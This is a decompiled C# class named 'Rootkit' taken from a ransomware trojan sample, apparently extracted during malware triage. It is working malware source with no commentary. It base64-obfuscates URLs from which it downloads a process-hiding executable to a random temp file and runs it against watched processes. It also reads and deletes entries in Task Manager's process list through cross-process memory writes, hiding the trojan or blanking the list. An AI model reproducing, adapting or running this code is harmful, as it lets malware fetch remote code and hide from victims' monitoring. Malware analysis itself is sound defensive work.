// Decompiled with JetBrains decompiler
// Type: Complex.Rootkit
// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10231E92-BCE6-4007-A463-67D77912E754
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.Win32.Generic-5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Complex
{
  internal class Rootkit
  {
    private const int PROCESS_VM_OPERATION = 8;
    private const int PROCESS_VM_READ = 16;
    private const int PROCESS_VM_WRITE = 32;
    private const int PROCESS_ALL_ACCESS = 0;
    private const int MEM_COMMIT = 4096;
    private const int MEM_RESERVE = 8192;
    private const int MEM_DECOMMIT = 16384;
    private const int MEM_RELEASE = 32768;
    private const int MEM_FREE = 65536;
    private const int MEM_PRIVATE = 131072;
    private const int MEM_MAPPED = 262144;
    private const int MEM_TOP_DOWN = 1048576;
    private const int PAGE_NOACCESS = 1;
    private const int PAGE_READONLY = 2;
    private const int PAGE_READWRITE = 4;
    private const int PAGE_WRITECOPY = 8;
    private const int PAGE_EXECUTE = 16;
    private const int PAGE_EXECUTE_READ = 32;
    private const int PAGE_EXECUTE_READWRITE = 64;
    private const int PAGE_EXECUTE_WRITECOPY = 128;
    private const int PAGE_GUARD = 256;
    private const int PAGE_NOCACHE = 512;
    private const int LVM_FIRST = 4096;
    private const int LVM_GETITEMCOUNT = 4100;
    private const int LVM_DELETEITEM = 4104;
    private const int LVM_GETITEMTEXTA = 4141;
    private const int LVM_SETITEMTEXTA = 4142;
    private const int LVM_DELETECOLUMN = 4124;
    private static volatile bool endWorker = false;
    public static volatile bool hideOnlyTrojan = true;

    public static string DownloadTool()
    {
      Program.toolLocation = IntPtr.Size != 8 ? Rootkit.DownloadFile(new Uri(Program.Base64Decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlMzIuZXhl"))) : Rootkit.DownloadFile(new Uri(Program.Base64Decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlNjQuZXhl")));
      return Program.toolLocation;
    }

    public static string DownloadFile(Uri Url)
    {
      try
      {
        string path2 = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
        new WebClient().DownloadFile(Url, Path.Combine(Path.GetTempPath(), path2));
        return Path.Combine(Path.GetTempPath(), path2);
      }
      catch
      {
      }
      return string.Empty;
    }

    public static Process IsProcessOpen(string name)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName.Contains(name))
          return process;
      }
      return (Process) null;
    }

    public static void WaitForProcess(string[] processesToCheck)
    {
      string command = Rootkit.DownloadTool();
      if (string.IsNullOrEmpty(command))
        return;
      while (true)
      {
        foreach (string name in processesToCheck)
        {
          Process process = Rootkit.IsProcessOpen(name);
          if (process != null)
          {
            string str = process.Id.ToString();
            Program.ProcessCommand(command, str + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName));
            Program.ProcessCommand(command, str + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + " *32");
          }
        }
        Thread.Sleep(200);
      }
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(
      int dwDesiredAccess,
      bool bInheritHandle,
      uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(
      IntPtr hProcess,
      IntPtr lpAddress,
      uint dwSize,
      int flAllocationType,
      int flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualFreeEx(
      IntPtr hProcess,
      IntPtr lpAddress,
      uint dwSize,
      int dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(
      IntPtr hProcess,
      IntPtr lpBaseAddress,
      byte[] lpBuffer,
      uint nSize,
      out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(
      IntPtr hProcess,
      IntPtr lpBaseAddress,
      [Out] byte[] lpBuffer,
      int dwSize,
      out UIntPtr lpNumberOfBytesRead);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern IntPtr SendMessage(
      IntPtr hWnd,
      uint Msg,
      IntPtr wParam,
      IntPtr lParam);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindowEx(
      IntPtr parentHandle,
      IntPtr childAfter,
      string className,
      string windowTitle);

    private static byte[] StructureToByteArray(object obj)
    {
      int length = Marshal.SizeOf(obj);
      byte[] destination = new byte[length];
      IntPtr num = Marshal.AllocHGlobal(length);
      Marshal.StructureToPtr(obj, num, true);
      Marshal.Copy(num, destination, 0, length);
      Marshal.FreeHGlobal(num);
      return destination;
    }

    private static IntPtr OpenProcessHandle(uint pid) => Rootkit.OpenProcess(56, false, pid);

    private static void CloseProcessHandle(IntPtr hProcess) => Rootkit.CloseHandle(hProcess);

    private static IntPtr AllocExternalMemory(uint memSize, IntPtr hProcess) => Rootkit.VirtualAllocEx(hProcess, IntPtr.Zero, memSize, 12288, 4);

    private static void FreeExternalMemory(IntPtr hProcess, IntPtr MemAddress, uint memSize) => Rootkit.VirtualFreeEx(hProcess, MemAddress, memSize, 32768);

    private static IntPtr FindTaskManager()
    {
      IntPtr window = Rootkit.FindWindow("TaskManagerWindow", "Administrador de tareas");
      return !(window == IntPtr.Zero) ? Rootkit.FindWindowEx(Rootkit.FindWindowEx(window, IntPtr.Zero, "#32770", (string) null), IntPtr.Zero, "SysListView32", "Procesos") : Rootkit.FindWindowEx(Rootkit.FindWindowEx(Rootkit.FindWindow("#32770", "Task Manager"), IntPtr.Zero, "#32770", (string) null), IntPtr.Zero, "SysListView32", "Processes");
    }

    private static IntPtr GetItemCount(IntPtr handle) => Rootkit.SendMessage(handle, 4100U, IntPtr.Zero, IntPtr.Zero);

    private static void DeleteItem(IntPtr handle, IntPtr index) => Rootkit.SendMessage(handle, 4104U, index, IntPtr.Zero);

    private static void DeleteColumn(IntPtr handle) => Rootkit.SendMessage(handle, 4124U, IntPtr.Zero, IntPtr.Zero);

    private static string GetItemText(IntPtr handle, IntPtr index)
    {
      byte[] numArray = new byte[50];
      Rootkit.LVITEM structure = new Rootkit.LVITEM();
      uint lpdwProcessId;
      int windowThreadProcessId = (int) Rootkit.GetWindowThreadProcessId(handle, out lpdwProcessId);
      IntPtr hProcess = Rootkit.OpenProcessHandle(lpdwProcessId);
      IntPtr num1 = Rootkit.AllocExternalMemory((uint) Marshal.SizeOf<Rootkit.LVITEM>(structure), hProcess);
      IntPtr num2 = Rootkit.AllocExternalMemory(50U, hProcess);
      structure.iItem = index;
      structure.iSubItem = (IntPtr) 0;
      structure.cchTextMax = 50U;
      structure.pszText = num2;
      UIntPtr num3;
      Rootkit.WriteProcessMemory(hProcess, num1, Rootkit.StructureToByteArray((object) structure), (uint) Marshal.SizeOf<Rootkit.LVITEM>(structure), out num3);
      Rootkit.SendMessage(handle, 4141U, index, num1);
      Rootkit.ReadProcessMemory(hProcess, num2, numArray, 50, out num3);
      Rootkit.FreeExternalMemory(hProcess, num1, (uint) Marshal.SizeOf<Rootkit.LVITEM>(structure));
      Rootkit.FreeExternalMemory(hProcess, num2, 50U);
      Rootkit.CloseProcessHandle(hProcess);
      return Encoding.ASCII.GetString(numArray);
    }

    private static void HideProcess(string process)
    {
      IntPtr taskManager = Rootkit.FindTaskManager();
      if (!(taskManager != IntPtr.Zero))
        return;
      int itemCount = (int) Rootkit.GetItemCount(taskManager);
      for (int index = 0; index < itemCount; ++index)
      {
        if (Rootkit.GetItemText(taskManager, (IntPtr) index).Contains(process))
          Rootkit.DeleteItem(taskManager, (IntPtr) index);
      }
    }

    private static void HideAllProcesses()
    {
      IntPtr taskManager = Rootkit.FindTaskManager();
      if (!(taskManager != IntPtr.Zero))
        return;
      Rootkit.DeleteColumn(taskManager);
      Rootkit.DeleteColumn(taskManager);
      Rootkit.DeleteColumn(taskManager);
      Rootkit.DeleteColumn(taskManager);
      Rootkit.DeleteColumn(taskManager);
    }

    public static void Hide() => new Thread(new ThreadStart(Rootkit.Worker)).Start();

    public static void StopHiding() => Rootkit.endWorker = true;

    private static void Worker()
    {
      while (!Rootkit.endWorker)
      {
        if (Rootkit.hideOnlyTrojan)
        {
          Rootkit.HideProcess(Process.GetCurrentProcess().ProcessName + ".exe");
          Thread.Sleep(525);
        }
        else
        {
          Rootkit.HideAllProcesses();
          Thread.Sleep(1000);
        }
      }
      Rootkit.endWorker = false;
    }

    private struct LVITEM
    {
      public uint mask;
      public IntPtr iItem;
      public IntPtr iSubItem;
      public uint state;
      public uint stateMask;
      public IntPtr pszText;
      public uint cchTextMax;
      public int iImage;
      public IntPtr lParam;
    }
  }
}
